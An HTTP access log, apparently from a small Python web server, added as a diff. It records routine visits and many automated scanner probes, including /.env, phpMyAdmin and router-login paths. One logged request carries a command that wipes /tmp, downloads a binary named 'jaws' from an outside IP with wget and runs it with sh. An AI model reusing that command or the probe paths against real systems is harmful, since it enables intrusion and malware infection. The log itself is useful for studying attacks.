+85.159.27.200 - - [16/May/2023 03:39:37] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 03:39:38] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [16/May/2023 03:39:41] "GET /favicon.ico HTTP/1.1" 404 -
+85.159.27.200 - - [16/May/2023 03:39:52] "POST /generate_text HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 03:39:52] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [16/May/2023 03:39:58] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 03:39:59] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [16/May/2023 03:40:13] "POST /generate_text HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 03:40:13] "GET /static/style.css HTTP/1.1" 304 -
+152.89.196.144 - - [16/May/2023 03:50:34] "GET /actuator/gateway/routes HTTP/1.1" 404 -
+85.159.27.200 - - [16/May/2023 03:56:57] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 03:56:58] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [16/May/2023 03:57:11] "GET /favicon.ico HTTP/1.1" 404 -
+85.159.27.200 - - [16/May/2023 03:57:48] "POST /generate_text HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 03:57:48] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [16/May/2023 03:59:29] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 03:59:30] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [16/May/2023 03:59:51] "POST /generate_text HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 03:59:51] "GET /static/style.css HTTP/1.1" 304 -
+85.159.27.200 - - [16/May/2023 04:01:05] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 04:01:10] "GET /static/style.css HTTP/1.1" 304 -
+20.70.237.249 - - [16/May/2023 04:25:40] "GET /.env HTTP/1.1" 404 -
+20.70.237.249 - - [16/May/2023 04:25:41] "POST / HTTP/1.1" 405 -
+87.121.221.49 - - [16/May/2023 04:55:17] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+158.255.77.107 - - [16/May/2023 05:02:31] "GET / HTTP/1.1" 200 -
+14.160.121.122 - - [16/May/2023 05:03:17] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 5.255.111.128/jaws;sh+/tmp/jaws HTTP/1.1')
+14.160.121.122 - - [16/May/2023 05:03:17] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 5.255.111.128/jaws;sh+/tmp/jaws HTTP/1.1" HTTPStatus.BAD_REQUEST -
+157.230.100.3 - - [16/May/2023 05:06:55] code 400, message Bad request version ('À\x14À')
+157.230.100.3 - - [16/May/2023 05:06:55] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03­\x1d\x7f\x0c\x9d\x95îÔ±BÃj\x80j\x9f\x1aúh5Ã\x04\x0f3kß\x9f¨\x9dw\x7fÐl\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+157.230.100.3 - - [16/May/2023 05:06:56] code 400, message Bad request version ('À\x14À')
+157.230.100.3 - - [16/May/2023 05:06:56] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03lËvç.\x96\x17\x1b\x8aáÆâÁ?PôÉ\x82 á{\x1dã\x9fû*S~çVñü\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+157.230.100.3 - - [16/May/2023 05:06:56] "GET / HTTP/1.1" 200 -
+157.230.100.3 - - [16/May/2023 05:06:56] "GET /client/get_targets HTTP/1.1" 404 -
+157.230.100.3 - - [16/May/2023 05:06:56] "GET /upl.php HTTP/1.1" 404 -
+157.230.100.3 - - [16/May/2023 05:06:56] code 400, message Bad request version ('À\x14À')
+157.230.100.3 - - [16/May/2023 05:06:56] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03½Gi£¡~7\x12r\x92áxÀ\x00t\x09Çäe\x05k\x03Ä6-\x17a¼3Ùý^\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+157.230.100.3 - - [16/May/2023 05:06:56] "GET /geoip/ HTTP/1.1" 404 -
+157.230.100.3 - - [16/May/2023 05:06:56] "GET / HTTP/1.1" 200 -
+157.230.100.3 - - [16/May/2023 05:06:56] "GET /favicon.ico HTTP/1.1" 404 -
+103.116.52.145 - - [16/May/2023 05:09:02] "GET / HTTP/1.1" 200 -
+43.128.227.146 - - [16/May/2023 05:39:34] "GET / HTTP/1.1" 200 -
+5.127.10.250 - - [16/May/2023 05:45:28] "HEAD /robots.txt HTTP/1.0" 404 -
+45.128.232.121 - - [16/May/2023 06:05:29] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+20.55.121.152 - - [16/May/2023 06:12:41] "GET /.env HTTP/1.1" 404 -
+20.55.121.152 - - [16/May/2023 06:12:41] "POST / HTTP/1.1" 405 -
+117.196.119.198 - - [16/May/2023 06:23:44] "GET / HTTP/1.1" 200 -
+103.116.52.145 - - [16/May/2023 07:08:54] "GET / HTTP/1.1" 200 -
+205.210.31.153 - - [16/May/2023 07:34:21] code 400, message Bad request version ('À(À$À\x14À')
+205.210.31.153 - - [16/May/2023 07:34:21] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03îý\x8c\x83jÀ\x19\x0by¬çj1u¬¾·vFÂöÝ\x14ÁÿÊÂ\x0cÿB~w\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+158.255.77.107 - - [16/May/2023 07:34:43] "GET / HTTP/1.1" 200 -
+20.75.90.184 - - [16/May/2023 07:37:00] "GET /.env HTTP/1.1" 404 -
+20.75.90.184 - - [16/May/2023 07:37:00] "POST / HTTP/1.1" 405 -
+62.1.59.208 - - [16/May/2023 08:20:10] "GET / HTTP/1.1" 200 -
+89.218.247.130 - - [16/May/2023 08:25:26] "GET / HTTP/1.1" 200 -
+89.218.247.130 - - [16/May/2023 08:25:26] "GET /static/style.css HTTP/1.1" 200 -
+89.218.247.130 - - [16/May/2023 08:25:27] "GET /favicon.ico HTTP/1.1" 404 -
+158.255.77.107 - - [16/May/2023 09:40:29] "GET / HTTP/1.1" 200 -
+128.14.133.58 - - [16/May/2023 09:40:53] "GET / HTTP/1.1" 200 -
+158.255.77.107 - - [16/May/2023 09:44:16] "GET / HTTP/1.1" 200 -
+162.142.125.224 - - [16/May/2023 09:44:53] "GET / HTTP/1.1" 200 -
+162.142.125.224 - - [16/May/2023 09:44:53] "GET / HTTP/1.1" 200 -
+162.142.125.224 - - [16/May/2023 09:44:54] code 505, message Invalid HTTP version (2.0)
+162.142.125.224 - - [16/May/2023 09:44:54] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+162.142.125.224 - - [16/May/2023 09:44:54] "GET /favicon.ico HTTP/1.1" 404 -
+36.225.143.251 - - [16/May/2023 09:49:00] "GET / HTTP/1.1" 200 -
+64.62.197.16 - - [16/May/2023 09:49:02] "GET / HTTP/1.1" 200 -
+64.62.197.7 - - [16/May/2023 09:50:38] "GET /favicon.ico HTTP/1.1" 404 -
+64.62.197.6 - - [16/May/2023 09:51:15] "GET /geoserver/web/ HTTP/1.1" 404 -
+95.214.55.253 - - [16/May/2023 09:52:24] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+95.214.55.253 - - [16/May/2023 09:52:24] "\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+80.82.67.125 - - [16/May/2023 10:43:47] "GET / HTTP/1.1" 200 -
+80.82.67.125 - - [16/May/2023 10:43:48] "GET /HNAP1/ HTTP/1.1" 404 -
+36.225.143.251 - - [16/May/2023 10:48:51] "POST / HTTP/1.1" 405 -
+46.34.193.195 - - [16/May/2023 11:03:26] "GET /favicon.ico HTTP/1.1" 404 -
+81.43.68.16 - - [16/May/2023 11:47:30] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+81.43.68.16 - - [16/May/2023 11:47:30] "\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+192.241.221.12 - - [16/May/2023 12:02:55] "GET /portal/redlion HTTP/1.1" 404 -
+165.232.170.200 - - [16/May/2023 12:03:19] "GET / HTTP/1.1" 200 -
+165.232.170.200 - - [16/May/2023 12:04:08] "GET /.env HTTP/1.1" 404 -
+192.241.236.63 - - [16/May/2023 12:24:27] "GET /actuator/health HTTP/1.1" 404 -
+192.241.232.12 - - [16/May/2023 12:27:56] "GET /hudson HTTP/1.1" 404 -
+198.235.24.98 - - [16/May/2023 13:14:17] "GET / HTTP/1.1" 200 -
+172.104.11.34 - - [16/May/2023 13:33:17] code 400, message Bad request version ('À\x14À')
+172.104.11.34 - - [16/May/2023 13:33:17] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03»£å\x96ß*Ég\x19Ç&è2q~\x8b'\x90¡\x00#Ê\x8eÁS_\x97¡äæ9\x0f\x00\x00 À/À0À+À,Ì¨Ì©À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+176.222.167.126 - - [16/May/2023 14:27:09] "GET / HTTP/1.1" 200 -
+176.222.167.126 - - [16/May/2023 14:27:09] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.126 - - [16/May/2023 14:27:10] "GET /favicon.ico HTTP/1.1" 404 -
+159.65.111.248 - - [16/May/2023 14:52:18] "GET / HTTP/1.0" 200 -
+192.241.232.31 - - [16/May/2023 15:40:31] "GET / HTTP/1.1" 200 -
+176.222.167.126 - - [16/May/2023 15:49:15] "GET / HTTP/1.1" 200 -
+176.222.167.126 - - [16/May/2023 15:49:15] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.126 - - [16/May/2023 15:49:16] "GET /favicon.ico HTTP/1.1" 404 -
+176.222.167.126 - - [16/May/2023 15:49:23] "GET /files.html HTTP/1.1" 200 -
+176.222.167.126 - - [16/May/2023 15:49:23] "GET /static/files.css HTTP/1.1" 200 -
+176.222.167.126 - - [16/May/2023 15:49:25] "GET /file1.pdf HTTP/1.1" 404 -
+176.222.167.126 - - [16/May/2023 15:49:29] "GET /file2.pdf HTTP/1.1" 404 -
+45.92.1.195 - - [16/May/2023 15:58:36] "GET /.env HTTP/1.1" 404 -
+45.92.1.195 - - [16/May/2023 15:58:36] "POST / HTTP/1.1" 405 -
+198.199.102.221 - - [16/May/2023 16:03:41] "GET /ReportServer HTTP/1.1" 404 -
+31.171.184.172 - - [16/May/2023 16:22:13] "GET / HTTP/1.1" 200 -
+31.171.184.172 - - [16/May/2023 16:22:15] "GET / HTTP/1.1" 200 -
+31.171.184.172 - - [16/May/2023 16:22:18] "GET /static/style.css HTTP/1.1" 200 -
+31.171.184.172 - - [16/May/2023 16:22:18] "GET /favicon.ico HTTP/1.1" 404 -
+176.222.167.126 - - [16/May/2023 16:23:21] "GET / HTTP/1.1" 200 -
+176.222.167.126 - - [16/May/2023 16:23:21] "GET /static/style.css HTTP/1.1" 304 -
+162.246.16.194 - - [16/May/2023 17:04:38] code 400, message Bad request version ("l½Wû!1Æ\x9b¼´\x1aÿA\x99à´àB\x97ÛâøÈa\x7f\x05\x9eöân-Ý\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+162.246.16.194 - - [16/May/2023 17:04:38] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03%+\x955«+"\x97À3Ç\x11\x8738\x80z\x09c[¥'XT\x03\x83Ý_\x9efè\x98 l½Wû!1Æ\x9b¼´\x1aÿA\x99à´àB\x97ÛâøÈa\x7f\x05\x9eöân-Ý\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+162.246.16.194 - - [16/May/2023 17:04:38] "GET / HTTP/1.1" 200 -
+185.100.87.136 - - [16/May/2023 17:24:39] code 400, message Bad request version ('Ý%d1\x17¦%nÅ')
+185.100.87.136 - - [16/May/2023 17:24:39] "É\x94Ñ¦®\x9c\x05lM/\x09\x8cp#î\x9d*5#]ÇR:È\x8e/\x11¸Í\x89Zû¤\x19fÒÎ³¡\x81»ü Ý%d1\x17¦%nÅ" HTTPStatus.BAD_REQUEST -
+185.100.87.136 - - [16/May/2023 17:24:48] code 400, message Bad HTTP/0.9 request type ('\x10')
+185.100.87.136 - - [16/May/2023 17:24:48] "\x10 \x00\x00BBBBº\x8cÁ«DAAA" HTTPStatus.BAD_REQUEST -
+46.34.193.195 - - [16/May/2023 17:44:55] "GET /favicon.ico HTTP/1.1" 404 -
+103.61.74.117 - - [16/May/2023 18:12:04] "GET / HTTP/1.1" 200 -
+107.23.201.151 - - [16/May/2023 18:16:33] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+107.23.201.151 - - [16/May/2023 18:16:33] "\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+94.102.61.10 - - [16/May/2023 18:27:28] "GET / HTTP/1.1" 200 -
+167.99.93.157 - - [16/May/2023 19:05:39] code 400, message Bad request syntax ('\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03Z§`')
+167.99.93.157 - - [16/May/2023 19:05:39] "\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03Z§`" HTTPStatus.BAD_REQUEST -
+104.155.19.199 - - [16/May/2023 19:06:29] code 400, message Bad request version ('\x9b')
+104.155.19.199 - - [16/May/2023 19:06:29] "\x16\x03\x01\x00M\x01\x00\x00I\x03\x03S''î¨6ÈU¹kÒý\x83Xv&uØ¹ \x90\x11Õáb&§®-\x1aè\x88 sñ\x89/È)_­Ú\x0e»OCFñµ®äÂ'\x87\x09\x9b" HTTPStatus.BAD_REQUEST -
+104.155.19.199 - - [16/May/2023 19:06:31] "OPTIONS / HTTP/1.0" 200 -
+196.64.61.187 - - [16/May/2023 19:46:13] "GET /.env HTTP/1.1" 404 -
+196.64.61.187 - - [16/May/2023 19:46:13] "POST / HTTP/1.1" 405 -
+179.43.177.243 - - [16/May/2023 19:56:18] "GET / HTTP/1.1" 200 -
+170.64.163.92 - - [16/May/2023 19:57:05] "GET /1.php HTTP/1.1" 404 -
+201.2.178.189 - - [16/May/2023 20:00:24] "GET / HTTP/1.1" 200 -
+45.79.181.104 - - [16/May/2023 20:55:05] "GET / HTTP/1.1" 200 -
+51.158.37.186 - - [16/May/2023 20:56:07] "GET / HTTP/1.1" 200 -
+51.158.37.186 - - [16/May/2023 20:56:08] "GET /favicon.ico HTTP/1.1" 404 -
+201.2.178.189 - - [16/May/2023 21:04:19] "GET / HTTP/1.1" 200 -
+198.235.24.230 - - [16/May/2023 21:26:53] "GET / HTTP/1.0" 200 -
+179.43.177.243 - - [16/May/2023 21:48:02] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+185.233.19.102 - - [16/May/2023 22:14:27] "GET / HTTP/1.1" 200 -
+46.34.193.195 - - [16/May/2023 22:20:35] "GET /favicon.ico HTTP/1.1" 404 -
+109.237.97.180 - - [16/May/2023 22:21:18] "GET /.env HTTP/1.1" 404 -
+109.237.97.180 - - [16/May/2023 22:21:18] code 400, message Bad request version ('\x96êdL\x88\x02¥\x8bNs9Õ\x15ÐùMÝ\x88\x99+ürÅEg\x06E@\x86\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+109.237.97.180 - - [16/May/2023 22:21:18] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\x0fÜQ¿ \x146]$ïpý\x01ð>\x1e1S\\U\x97Ø±\x86U±´\x92kª\x81» Çe\x0d\x96êdL\x88\x02¥\x8bNs9Õ\x15ÐùMÝ\x88\x99+ürÅEg\x06E@\x86\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À­À$À(À" HTTPStatus.BAD_REQUEST -
+107.170.244.11 - - [16/May/2023 22:37:55] "GET /manager/text/list HTTP/1.1" 404 -
+45.95.169.240 - - [16/May/2023 22:39:55] "GET / HTTP/1.1" 200 -
+192.241.201.126 - - [16/May/2023 23:27:12] "GET /manager/html HTTP/1.1" 404 -
+45.93.201.118 - - [17/May/2023 00:08:31] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.93.201.118 - - [17/May/2023 00:08:31] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+152.89.196.144 - - [17/May/2023 00:18:06] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+93.100.112.115 - - [17/May/2023 01:00:25] "GET / HTTP/1.1" 200 -
+93.100.112.115 - - [17/May/2023 01:00:26] "GET /HNAP1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:27] "GET /phpmyadmin/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:27] "GET /phpMyAdmin/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:28] "GET /PMA/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:28] "GET /pma/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:28] "GET /admin/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:29] "GET /dbadmin/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:29] "GET /mysql/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:30] "GET /myadmin/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:30] "GET /openserver/phpmyadmin/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:31] "GET /phpmyadmin2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:31] "GET /phpMyAdmin2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:32] "GET /phpMyAdmin-2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:32] "GET /php-my-admin/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:33] "GET /phpMyAdmin-2.2.3/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:34] "GET /phpMyAdmin-2.2.6/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:34] "GET /phpMyAdmin-2.5.1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:34] "GET /phpMyAdmin-2.5.4/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:34] "GET /phpMyAdmin-2.5.5-rc1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:35] "GET /phpMyAdmin-2.5.5-rc2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:35] "GET /phpMyAdmin-2.5.5/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:36] "GET /phpMyAdmin-2.5.5-pl1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:36] "GET /phpMyAdmin-2.5.6-rc1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:37] "GET /phpMyAdmin-2.5.6-rc2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:37] "GET /phpMyAdmin-2.5.6/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:38] "GET /phpMyAdmin-2.5.7/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:39] "GET /phpMyAdmin-2.5.7-pl1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:39] "GET /phpMyAdmin-2.6.0-alpha/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:40] "GET /phpMyAdmin-2.6.0-alpha2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:40] "GET /phpMyAdmin-2.6.0-beta1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:41] "GET /phpMyAdmin-2.6.0-beta2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:41] "GET /phpMyAdmin-2.6.0-rc1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:42] "GET /phpMyAdmin-2.6.0-rc2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:43] "GET /phpMyAdmin-2.6.0-rc3/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:44] "GET /phpMyAdmin-2.6.0/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:45] "GET /phpMyAdmin-2.6.0-pl1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:45] "GET /phpMyAdmin-2.6.0-pl2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:46] "GET /phpMyAdmin-2.6.0-pl3/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:46] "GET /phpMyAdmin-2.6.1-rc1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:48] "GET /phpMyAdmin-2.6.1-rc2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:48] "GET /phpMyAdmin-2.6.1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:49] "GET /phpMyAdmin-2.6.1-pl1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:50] "GET /phpMyAdmin-2.6.1-pl2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:52] "GET /phpMyAdmin-2.6.1-pl3/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:53] "GET /phpMyAdmin-2.6.2-rc1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:54] "GET /phpMyAdmin-2.6.2-beta1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:55] "GET /phpMyAdmin-2.6.2-rc1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:56] "GET /phpMyAdmin-2.6.2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:58] "GET /phpMyAdmin-2.6.2-pl1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:59] "GET /phpMyAdmin-2.6.3/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:00:59] "GET /phpMyAdmin-2.6.3-rc1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:00] "GET /phpMyAdmin-2.6.3/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:00] "GET /phpMyAdmin-2.6.3-pl1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:02] "GET /phpMyAdmin-2.6.4-rc1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:02] "GET /phpMyAdmin-2.6.4-pl1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:04] "GET /phpMyAdmin-2.6.4-pl2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:04] "GET /phpMyAdmin-2.6.4-pl3/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:04] "GET /phpMyAdmin-2.6.4-pl4/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:05] "GET /phpMyAdmin-2.6.4/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:06] "GET /phpMyAdmin-2.7.0-beta1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:06] "GET /phpMyAdmin-2.7.0-rc1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:07] "GET /phpMyAdmin-2.7.0-pl1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:08] "GET /phpMyAdmin-2.7.0-pl2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:09] "GET /phpMyAdmin-2.7.0/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:10] "GET /phpMyAdmin-2.8.0-beta1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:10] "GET /phpMyAdmin-2.8.0-rc1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:12] "GET /phpMyAdmin-2.8.0-rc2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:12] "GET /phpMyAdmin-2.8.0/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:13] "GET /phpMyAdmin-2.8.0.1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:14] "GET /phpMyAdmin-2.8.0.2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:15] "GET /phpMyAdmin-2.8.0.3/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:16] "GET /phpMyAdmin-2.8.0.4/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:17] "GET /phpMyAdmin-2.8.1-rc1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:17] "GET /phpMyAdmin-2.8.1/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:18] "GET /phpMyAdmin-2.8.2/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:20] "GET /sqlmanager/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:20] "GET /mysqlmanager/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:22] "GET /p/m/a/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:23] "GET /PMA2005/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:24] "GET /pma2005/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:24] "GET /phpmanager/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:25] "GET /php-myadmin/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:26] "GET /phpmy-admin/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:26] "GET /webadmin/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:28] "GET /sqlweb/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:28] "GET /websql/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:29] "GET /webdb/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:30] "GET /mysqladmin/ HTTP/1.1" 404 -
+93.100.112.115 - - [17/May/2023 01:01:30] "GET /mysql-admin/ HTTP/1.1" 404 -
+201.2.178.189 - - [17/May/2023 01:19:19] "GET /favicon.ico HTTP/1.1" 404 -
+201.2.178.189 - - [17/May/2023 01:19:20] "GET /image/lgbg.jpg HTTP/1.1" 404 -
+201.2.178.189 - - [17/May/2023 01:19:20] "GET /skin/default_1/images/logo.png HTTP/1.1" 404 -
+201.2.178.189 - - [17/May/2023 01:19:21] "GET / HTTP/1.1" 200 -
+201.2.178.189 - - [17/May/2023 01:19:22] "GET /login.rsp HTTP/1.1" 404 -
+152.89.196.144 - - [17/May/2023 02:01:07] "GET /actuator/gateway/routes HTTP/1.1" 404 -
+87.236.176.38 - - [17/May/2023 02:17:06] "GET / HTTP/1.1" 200 -
+134.122.133.97 - - [17/May/2023 02:21:09] "GET /video/2578.html HTTP/1.1" 404 -
+87.121.221.49 - - [17/May/2023 02:32:52] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+34.79.162.186 - - [17/May/2023 02:52:49] "GET / HTTP/1.1" 200 -
+172.104.242.173 - - [17/May/2023 03:46:54] code 400, message Bad request version ('¯+\xadKkÅà\\s\x9c½Ë')
